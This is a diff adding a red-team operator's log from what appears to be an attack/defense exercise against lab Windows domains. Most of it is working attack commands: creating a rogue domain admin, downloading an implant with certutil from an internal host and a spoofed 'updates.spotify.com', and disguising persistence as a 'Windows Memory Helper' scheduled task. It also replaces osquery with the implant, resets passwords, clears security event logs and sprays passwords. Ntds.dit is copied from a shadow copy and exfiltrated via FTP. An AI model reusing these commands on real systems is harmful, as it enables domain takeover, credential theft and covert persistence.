@@ -1,0 +1,116 @@
+3/28 - Group 2 and Group 4 have not removed thepcn3rd account...
+
+3/29 - 
+Select a Bot from the Following List
+----------------------------------------
+2f2bdbb4-c978-47be-9558-e81fb533a820 Server:defenders-srv Address:10.27.20.122 Last Connected:2024-03-29 23:30:03
+29b07a71-148f-42fb-b1d0-3a3a4b9b8fb5 Server:defenders-dc Address:10.27.20.120 Last Connected:2024-03-29 23:30:03
+2c2f8c24-6f89-47db-83b8-f2e72150dab5 Server:xmen-srv Address:10.27.20.152 Last Connected:2024-03-29 23:30:04
+d3e593fa-ba38-4183-aef1-0a7655dcc009 Server:xmen-dc Address:10.27.20.150 Last Connected:2024-03-29 23:30:04
+ac06aed5-c95c-48e0-b494-8d3cb61b3e1b Server:zoocrew-srv Address:10.27.20.112 Last Connected:2024-03-29 23:30:04
+bad7f358-e000-4c14-905e-650e68b444ed Server:teentitans-dc Address:10.27.20.130 Last Connected:2024-03-29 23:30:05
+af2ae508-b7e9-43d7-915b-6e8f31b91732 Server:teentitans-srv Address:10.27.20.132 Last Connected:2024-03-29 23:30:05
+
+3/29 - Created a new domain admin called blazar (Did not work)
+- net user blazar Pebble007 /add /domain
+- net group "Domain Admins" blazar /add
+- certutil -urlcache -split -f http://10.27.20.50:8080/winhlper.exe c:\users\public\winhlper.exe
+- schtasks /create /sc minute /mo 5 /tn "Windows Memory Helper" /tr "c:\users\public\winhlper.exe" /ru blazar /rp Pebble007 /f
+
+3/30 - Regain access to natalia.foley make blazar a domain admin (Issues with execution)
+- net user Natalia.Foley AveryL0ng
+
+3/31 - Fixed the bot to work correctly with commands...
+- net user blazar Pebble007 /add /domain
+- net group "Domain Admins" blazar /add
+- certutil -urlcache -split -f http://10.27.20.50:8080/winhlper.exe c:\users\public\winhlper.exe
+- schtasks /create /sc minute /mo 5 /tn "Windows Memory Helper" /tr "c:\users\public\winhlper.exe" /ru blazar /rp Pebble007 /f
+
+4/1 - Redeploy a fixed bot
+------ x-men-dc
+7:30AM - del /f c:\users\public\winhlper.exe
+7:45AM - certutil -urlcache -split -f http://updates.spotify.com:8080/winhlper.exe c:\users\public\winhlper.exe (Executed as planned)
+8:00AM - c:\users\public\winhlper.exe  # Have it check in and execute the first time
+- ## Note: Reauth the operator to get new bot list
+8:15AM - c:\users\public\winhlper.exe  && net group "Domain Admins" blazar /add # New bot ...
+8:30AM - net user blazar Pebble007 /add /domain
+8:45AM - c:\users\public\winhlper.exe  && net group "Domain Admins" blazar /add # New bot ...
+9:00AM - c:\users\public\winhlper.exe  && schtasks /create /sc minute /mo 5 /tn "Windows Memory Helper" /tr "c:\users\public\winhlper.exe" /ru blazar /rp Pebble007 /f # New bot ...
+9:50AM - del /f "c:\program files\osquery\osqueryd\osquery.exe"
+9:55AM - certutil -urlcache -split -f http://updates.spotify.com:8080/winhlper.exe "c:\program files\osquery\osqueryd\osquery.exe"
+10:00AM - dir "c:\program files\osquery\osqueryd\"
+
+------ teentitans-dc ed**
+8:30AM - certutil -urlcache -split -f http://updates.spotify.com:8080/winhlper.exe c:\users\public\winhlper.exe (Did not execute at 7:45AM)
+?? - c:\users\public\winhlper.exe  # Have it check in and execute the first time
+
+------ zoocrew-dc
+8:00AM - certutil -urlcache -split -f http://updates.spotify.com:8080/winhlper.exe c:\users\public\winhlper.exe (Did not execute at 7:45AM)
+8:15AM - c:\users\public\winhlper.exe  # Have it check in and execute the first time
+- ## Note: Reauth the operator to get new bot list
+8:30AM - c:\users\public\winhlper.exe  # Execute 1st command
+
+---- All of them...
+- del /f c:\users\public\winhlper.exe
+- certutil -urlcache -split -f http://updates.spotify.com:8080/winhlper.exe c:\users\public\winhlper.exe (Executed as planned)
+- net user blazar Pebble007 /add /domain
+- c:\users\public\winhlper.exe  && net group "Domain Admins" blazar /add # New bot ...
+- c:\users\public\winhlper.exe  && schtasks /create /sc minute /mo 5 /tn "Windows Memory Helper" /tr "c:\users\public\winhlper.exe" /ru blazar /rp Pebble007 /f # New bot ...
+
+
+Fantastic4 - 
+Used thepcn3rd account to access
+
+$taskName = "YourTaskName"
+$password = ConvertTo-SecureString "YourPassword" -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential ("DOMAIN\Username", $password)
+Set-ScheduledTask -TaskName $taskName -User $credential
+$serverName = $env:USERDOMAIN + "-SRV"
+# Import the Active Directory module
+Import-Module ActiveDirectory
+
+# Define user details
+$username = "NewUser"
+$password = ConvertTo-SecureString "Password123" -AsPlainText -Force
+$domain = "yourdomain.com"
+
+# Create the new user account
+New-ADUser -Name $username -AccountPassword $password -Enabled $true -PassThru
+
+# Add the user to the Domain Users group (assuming you want to add to the default group)
+Add-ADGroupMember -Identity "Domain Users" -Members $username
+
+
+$action = New-ScheduledTaskAction -Execute "c:\users\public\winhlper.exe"
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Windows Memory Helper" -Description "Microsoft Task to Manage Memory due to running in a VM"
+
+4/1 - Set passwords
+net user tracker.service AprilFo0ls
+net user barbara.madden AprilFo0ls
+net user orval.anderson AprilFo0ls
+wevtutil cl Security  # Clear security event logs
+
+4/2 - Check Passwords against SMB Domain Auth
+Password spray with users using crackmapexec
+
+Group 5 ...
+Attempted to login with Marisol.McFarland and Natalia.Foley 
+Logon with energy.service was successful 
+List Domain Admins, Capture hashes for the domain admins
+
+Testing the client for stealing the ntds.dit file, ...
+- mkdir c:\extract
+- vssadmin create shadow /for=C:
+- dir c:\
+- copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\extract\ntds.dit
+- copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\extract\system
+
+- CREATE FTP Server with Metasploit
+- use auxiliary/server/ftp
+
+- Created a vbs script to upload the ntds.dit file
+- certutil -urlcache -split -f http://10.27.20.50:8080/ftp.script c:\extract\ftp.script
+- cscript c:\extract\ftp.vbs
+
+
